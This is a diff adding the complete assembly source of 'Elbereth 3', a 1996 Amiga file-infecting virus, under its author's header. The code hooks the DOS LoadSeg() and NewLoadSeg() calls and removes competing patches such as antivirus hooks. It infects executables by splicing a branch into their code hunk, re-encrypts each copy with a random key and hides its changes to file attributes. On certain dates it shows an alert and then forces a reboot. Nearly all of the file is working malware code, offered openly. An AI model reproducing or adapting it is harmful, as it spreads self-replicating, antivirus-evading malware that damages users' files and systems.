@@ -1,0 +1,481 @@
+;===========================================================================
+;                          Elbereth_3.asm       (900 bytes)
+;===========================================================================
+;
+;
+;	V3. Virus ONLY patches LoadSeg() and NewLoadSeg(). Length is 900 bytes;
+;	   totally  rewritten cryptroutine. V3 kick out from memory ANY patch
+;	   installed on LoadSeg() vector in memory before virus by calculation
+;	   value of original adress of LoadSeg in ROM. Now LoadSeg's() will
+;	   be patched again before ANY try of fileinfection.
+;	   Linkroutine rewritten: in 32kb range from the end of the hunk
+;	   first found 'Bcc.w', 'JSR -xy(a6)' or JSR xxyy(pc) will be replaced
+;	   by 'BSR.w' to the virus code. New technique is used to intercept
+;	   these instr.:
+;
+;	   - Virus gets an random value, and sub's this value from the adress
+;	   of the end of the hunk and starts scanning for "Bcc's" and "JSR's";
+;	   as a result intercepted instruction may be located in the middle
+;	   of the hunk !!!
+;	   Now virus checks number of sectors on actual device,
+;	   if more than 4824; files from 1800-265326 will be infected,
+;	   if not - only 1800-25708 will be infected by this virus.
+;	   Filename not starts with 'v' or 'V' but only if file is greater
+;	   than 25 kb. If smaller then the file is infected, if bigger virus
+;	   removes LoadSeg's() patches from memory.
+;	   I think that antivirus programs will be not infected.
+;
+;
+;	   Virus restores protection bits, dates, comments etc.
+;	   Date is setted 100 years ahead for fast identify infected files.
+;	   Changes are not visible under FileMaster or like.
+;	   Checks date by getting timevalues from dosbase, if is after 20.00
+;	   o'clock and in field dt_Days after 'andi #$1F' is '0'
+;	   following alert will be displayed :
+;
+;	********************************************************************
+;                      == Elbereth 3 ==   © 1996 Poland
+;	********************************************************************
+;
+;	after pressing any mousebutton - reset.
+;	
+;
+;	Source is yours...
+;
+;
+;			(c) by * MaD roGEr * aug 1996 Silesia, Poland
+;===========================================================================
+;Note from september 2001: this virus crashes on kick 3.1 because of bug
+;in routine that finds original LoadSeg() adress. MaD roGEr/VRU!
+;===========================================================================
+
+;koniec+16 = DateStamp ptr
+;koniec+20 = file lock
+;koniec+24 = ptr to filename
+;koniec+28 = mem_ptr for program to infect
+;koniec+32 = unused
+;koniec+36 = protection mask
+;koniec+40 = info_data for Info()
+
+
+;===========================================================================
+		jsr	start2(pc)	;pseudoprogramm
+		rts			;
+
+start2
+		movem.l	d0-a6,-(a7)
+		bra.b	file_len
+
+start
+		movem.l	d0-a6,-(a7)
+len_to_code
+		move.w	#(koniec-coded_part)-1,d1
+		lea	coded_part(pc),a1
+arg		moveq	#1,d2
+decrypt
+		eori.b	d2,(a1)+		;decode_loop
+		addi.b	d1,d2			; -- || --
+		dbra	d1,decrypt		; -- || --
+
+file_len
+		move.l	4.w,a6
+		jsr	-636(a6)		;CacheClearU() ,exec
+
+coded_part	;===========================================================
+
+		lea	dosname(pc),a1
+		moveq	#35,d0
+		jsr	-552(a6)		;OldOpenLibrary() ,exec
+		beq.b	end
+		move.l	d0,a5
+		move.l	-148(a5),a0		;get LoadSeg() adres..
+		cmpi.w	#$2f01,(a0)		;is intercepted ??
+		beq.b	end			;yes..
+
+		moveq	#1,d1
+		swap	d1
+		moveq	#8,d0
+		lsl.l	d0,d0			;get 2kb of mem..
+
+		jsr	-684(a6)		;AllocVec(), exec
+
+		beq.b	end			;NO MEM !!!
+		move.l	d0,a3
+len_of_code
+		move.w	#koniec-start-1,d0
+		lea	start(pc),a0
+copy_to_mem
+		move.b	(a0)+,(a3)+
+		dbra	d0,copy_to_mem
+
+		jsr	set_loadseg-koniec(a3)	;intercept LoadSeg()
+
+end
+		move.l	60(sp),a0		;move PC from stack to A0
+		subq.l	#4,a0			;set PC to JSR_xx(pc) again..
+		move.l	orig_instr(pc),(a0)	;replace orig.instr.
+		move.l	a0,60(sp)		;set PC to this instr.
+		bsr.w	clear_cache
+end2
+		movem.l	(a7)+,d0-a6
+
+		rts
+		;===========================================================
+new_loadseg
+		move.l	d1,-(sp)		;save path to the file
+
+		dc.w	$4eb9			;call LoadSeg()
+loadseg_adres
+		dc.l	0
+		movem.l	d0-a6,-(sp)		;all registers to stack
+		lea	koniec+24(pc),a0
+		move.l	60(sp),d1		;filename
+		move.l	d1,(a0)
+
+		bsr.B	infect
+
+		movem.l	(sp)+,d0-a6		;all registers from stack
+
+		addq.l	#4,sp			;4 bytes MUST be added because
+						;stack is decremented 4 b.
+						;at the start of the patch
+		
+		rts
+		;===========================================================
+len
+		dc.l	koniec-start		;length
+		;===========================================================
+orig_instr
+		nop
+		nop
+		;===========================================================
+restore_vec
+		move.l	loadseg_adres(pc),-148(a6)	;remove patch from
+		move.l	loadseg_adres(pc),-766(a6)	;DOS vectortable
+unlock
+		move.l	koniec+20(pc),d1
+		jsr	-90(a6)			;Unlock() ,dos
+		rts
+		;================================ link routine =============
+infect
+
+		cmpi.w	#$4af,86(a6)		;get minutes from Date_Stamp
+						;and check if is after 20.00
+		bmi.b	_BSR
+		and.w	#$1f,82(a6)		;get day from Date_Stamp
+		bne.b	_BSR
+		move.l	66(a6),a6		;get intuition base
+		lea	alert(pc),a0
+		moveq	#-1,d0
+		moveq	#20,d1
+		jsr	-90(a6)			;DisplayAlert() ,intuition
+
+		move.l	4.w,a6
+		jmp	-726(a6)		;ColdReboot() ,exec
+
+		;------------------------------------------------------------
+_BSR		bsr.w	set_loadseg_2		;LoadSeg will be patched
+						;every time which will be
+						;in use
+
+		move.l	a5,a6
+		lea	koniec+20(pc),a2
+		move.l	4(a2),d1
+		moveq	#-1,d2
+		jsr	-84(a6)			;Lock() ,dos
+
+		beq.w	random_value
+		move.l	d0,(a2)
+value_14
+		lea	20(a2),a3		;Info_data
+
+		move.l	a3,d2
+
+		jsr	-102(a6)		;Examine() ,dos
+
+		beq.b	unlock
+		cmpi.b	#'V',8(a3)		;execution of antivirus ?!?!?
+		beq.b	check_size
+
+		cmpi.b	#'v',8(a3)		;execution of antivirus ?!?!?
+		bne.b	not_remove_f_mem	;no..
+
+check_size	move.l	124(a3),d1
+		cmpi.l	minimal_value(pc),d1	
+		bcc.b	restore_vec		;YEEESSSS !!!!!!!
+
+not_remove_f_mem
+
+		lea	132(a3),a5		;DateStamp ptr
+_2		btst	#15,2(a5)		;infected ?
+		bne.b	unlock			;yes..
+
+		move.l	a5,-4(a2)
+
+		move.l	-8(a5),d7		;file_length
+		move.l	-16(a5),16(a2)		;save protection bits
+
+
+
+
+		move.l	(a2),d1
+
+		jsr	-114(a6)		;Info() ,dos
+		
+cmp_write_p
+		cmpi.w	#82,10(a3)		;validated ?
+		bne.w	unlock
+		move.l	12(a3),d0		;blocks_total
+		move.w	copy_hunktable(pc),d1
+		ext.l	d1
+		cmpi.l	d1,d0		
+		bhi.b	check_disk_next
+
+		move.w	#minimal_value-max_file-2,max_file-koniec-18(a2)
+		bsr.w	clear_cache
+
+check_disk_next
+		sub.l	16(a3),d0		;blocks_used
+
+
+		moveq	#4,d1
+		cmpi.l	d1,d0			;free blocks > 4 ?
+		bmi.w	unlock
+
+max_file
+		move.l	file_len+2(pc),d1
+		cmpi.l	d1,d7			;max_file_length (265326)
+
+		bhi.w	unlock			;too big..
+
+		move.w	#file_len-max_file,max_file-koniec-18(a2)
+		bsr.w	clear_cache
+		move.l	len(pc),d1
+		lsl.l	#1,d1
+		cmpi.l	d1,d7			;min_file_length (1800)
+		bmi.w	unlock			;too small..
+		
+		bsr.w	unlock
+
+		move.l	4(a2),d1		;filename
+		
+		clr.l	d2			;"----RWED"
+
+		jsr	-186(a6)		;SetProtection() ,dos
+
+		move.l	a6,-(sp)
+		move.l	4.w,a6
+		move.l	d7,d0
+
+		add.l	len(pc),d0
+
+		moveq	#0,d1			;requirements
+		jsr	-684(a6)		;AllocVec() ,exec
+		beq.w	error_alloc
+
+		move.l	d0,8(a2)		;memory ptr
+
+		move.l	(sp)+,a6
+
+		move.l	koniec+24(pc),d1	;filename_ptr
+		move.l	#$3ed,d2		;mode OLD_FILE
+
+		jsr	-30(a6)			;Open() ,dos
+
+		beq.w	free
+		move.l	d0,d6
+		move.l	koniec+28(pc),d2	;memory ptr
+
+		add.l	len(pc),d2
+		movea.l	d2,a2
+		move.l	file_len+2(pc),d3
+
+		jsr	-42(a6)			;Read() ,dos
+		beq.w	close
+
+		move.l	d0,d5
+		move.l	d6,d1
+		moveq	#0,d2
+		moveq	#-1,d3
+		jsr	-66(a6)			;Seek() ,dos
+		move.l	a2,a0
+		moveq.l	#20,d7
+		move.l	(a2,d7.l),d0
+		cmpi.l	#$3f3,(a2)		;file is executable ?
+		bne.w	close
+		move.l	8(a2),d1		;get number of hunks
+		lsl.l	#2,d1
+		addi.l	d7,d1
+		adda.l	d1,a2
+		cmpi.l	#$3e9,(a2)		;first hunk is a code_hunk ?
+		bne.w	close
+		move.l	4(a2),d3
+
+		lsl.l	#2,d0
+		addq.l	#7,d1
+
+		move.l	len(pc),d2
+
+		lsr.l	#2,d2
+		add.l	d2,(a0,d7.l)		;add virus length (1.)
+		lea	start-koniec(a0),a1	;new adress of file in memory
+
+		movea.l	a1,a4
+copy_hunktable
+		move.b	(a0)+,(a1)+		;copy hunk_table
+		dbra	d1,copy_hunktable	; --  --  --  --
+
+		add.l	d2,-4(a1)		;add virus length (2.)
+		subq.l	#1,d3
+		move.l	d3,d2
+		lsl.l	#1,d2
+		addq.l	#8,a2
+copy_hunk
+		move.l	(a2)+,(a1)+		;copy first hunk
+		dbra	d3,copy_hunk		; --  --  --  --
+
+		move.w	#$3ff0,d3		;search range
+		move.w	start+2(pc),d1
+		move.l	a1,a2
+
+		;================================= "Bcc and JSR scanner" =====
+
+		clr.l	d7
+		move.b	$bfd800,d7		;get random value
+		lsl.l	#3,d7
+		cmpi.l	d7,d2			;is bigger than hunk ??
+		bmi.b	search_Bcc		;yes. (if bigger scan will be
+						;done from the end of the hunk)
+
+		move.l	d7,d1			;no.
+		sub.l	d1,d2
+		lsl.l	#1,d7
+		move.l	d7,d1
+		subq.l	#2,d1
+		sub.l	d7,a2
+
+
+search_Bcc	addq.w	#2,d1
+		subq.w	#1,d3
+		bmi.w	close3			; out of range
+		move.w	-(a2),d0
+		cmpi.w	_JSR(pc),d0		; JSR -xy(a6)?
+		beq.b	Bcc_found		; Yes !
+		cmpi.w	#$4eba,d0		; JSR xxxx(pc)?
+		beq.b	Bcc_found		; Yes!
+		tst.b	d0
+		bne.b	search_Bcc
+		and.w	#%1111000000000000,d0
+		rol.w	#4,d0
+		cmpi.b	#6,d0			; Bcc ?
+		beq.s	Bcc_found		; Yes !
+		dbra	d2,search_Bcc
+		bra.w	close3			; not found
+
+		;======================== end of "Bcc and JSR scanner" ======
+Bcc_found
+		lea	orig_instr(pc),a3
+		move.l	(a2),(a3)
+		move.w	_BSR(pc),(a2)+
+		move.w	d1,(a2)
+
+		movea.l	a1,a2
+		lea	start(pc),a0
+		move.w	len_of_code+2(pc),d1	;length_of_viruscode
+copy_virus
+		move.b	(a0)+,(a1)+		;copy virus_code
+		dbra	d1,copy_virus		; --  --  --  --
+
+		bsr.b	random_value
+
+		move.b	d7,arg-start+1(a2)	;save arg. in new copy
+		lea	coded_part-start(a2),a2
+
+		move.w	len_to_code+2(pc),d3
+code_loop
+		eori.b	d7,(a2)+		;code_loop
+		addi.b	d3,d7			; -- || --
+		dbra	d3,code_loop		; -- || --
+
+		bsr.w	clear_cache
+
+		move.l	d5,d3
+
+		add.l	len(pc),d3
+
+		move.l	a4,d2
+		move.l	d6,d1
+
+		jsr	-48(a6)			;Write() ,dos
+
+close
+		bsr.b	close2
+		move.l	koniec+24(pc),d1	;filename_ptr
+		move.l	koniec+16(pc),a0	;ptr to DateStamp
+		add.w	#$8ead,2(a0)		;add 100 years to date
+		move.l	a0,d2
+		jsr	-396(a6)		;SetFileDate() ,dos
+
+do_setprotection
+		move.l	koniec+24(pc),d1	;filename
+		move.l	koniec+36(pc),d2	;original protection bits
+		jsr	-186(a6)		;SetProtection(), dos
+free		move.l	a6,-(sp)
+		move.l	4.w,a6
+		move.l	koniec+28(pc),a1	;mem_ptr
+
+_JSR		jsr	-690(a6)		;FreeVec() ,exec
+error_alloc
+		move.l	(sp)+,a6
+random_value	move.b	$dff007,d7
+		rts
+
+		;=========================================================
+close3		pea	do_setprotection(pc)
+close2		move.l	d6,d1
+		jsr	-36(a6)
+		rts
+		;===========================================================
+set_loadseg_2
+		move.l	a6,a5
+		move.l	4.w,a6
+set_loadseg
+		lea	dosname(pc),a1		;load dos..
+		jsr	-96(a6)			;FindResident(), exec
+		move.l	d0,a0
+		move.l	60(a0),a0		;dos vectors in ROM
+		move.w	50(a0),d0		;LoadSeg offset
+		ext.l	d0
+		add.l	d0,a0			;adress of LoadSeg() in ROM
+		lea	new_loadseg(pc),a1
+		move.l	a0,loadseg_adres-new_loadseg(a1)
+		lea	-148(a5),a0
+		move.l	a1,(a0)			;move patch to LoadSeg entry
+		move.l	a1,-618(a0)		;move patch to NewLoadSeg entry
+
+clear_cache
+		move.l	a6,-(sp)
+		move.l	4.w,a6
+		jsr	-636(a6)		;CacheClearU(), exec
+		move.l	(sp)+,a6
+		rts
+		;===========================================================
+
+alert
+		dc.b	0,190,12
+		dc.b	'== Elbereth 3 ==    © 1996 Poland'
+
+minimal_value
+		dc.b	0,0
+
+dosname
+		DC.B	'dos.library',0
+
+
+koniec
+;---------------------
+;		moveq	#0,d0
+;		rts
+;
+;
+;	P.S.	Sorry for stupid names of labels...
